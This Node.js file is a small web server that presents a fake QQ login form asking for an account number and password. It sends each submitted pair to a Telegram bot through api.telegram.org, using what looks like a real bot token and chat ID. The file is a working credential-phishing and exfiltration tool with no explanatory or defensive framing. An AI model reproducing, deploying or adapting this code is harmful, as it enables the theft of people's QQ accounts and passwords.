var http = require('http');
var https = require('https');
var querystring = require('querystring');
 
var postHTML = 
  '<html><head><meta charset="utf-8"><title>qq登陆</title></head>' +
  '<body>' +
  '<form method="post">' +
  'QQ号： <input name="qq"><br>' +
  '密码： <input name="pwd"><br>' +
  '<input type="submit">' +
  '</form>' +
  '</body></html>';
 
http.createServer(function (req, res) {
  var body = "";
  req.on('data', function (chunk) {
    body += chunk;
  });
  req.on('end', function () {
    // 解析参数
    body = querystring.parse(body);
    // 设置响应头部信息及编码
    res.writeHead(200, {'Content-Type': 'text/html; charset=utf8'});
 
    if(body.qq && body.pwd) { // 输出提交的数据
        res.write("QQ号：" + body.qq);
        res.write("<br>");
     	res.write("密码：" + body.pwd);
	var temp = JSON.stringify(body);
	var options = {
                      hostname: 'api.telegram.org',
                      port: 443,
                      path: '/bot673939605:AAE7WUiGvBbtLztAUCqUJDyowSSM5qQG62s/sendMessage?chat_id=437532928&text=' + temp + '&parse_mode=HTML',             
                      method: 'GET'
                };
  var requ = https.request(options, function (resp){});
  requ.on('error', function (e) {
          console.log('problem with request: ' + e.message);  
  });
  requ.end();
   } else {  // 输出表单
        res.write(postHTML);
    }
    res.end();
  });
}).listen(80);
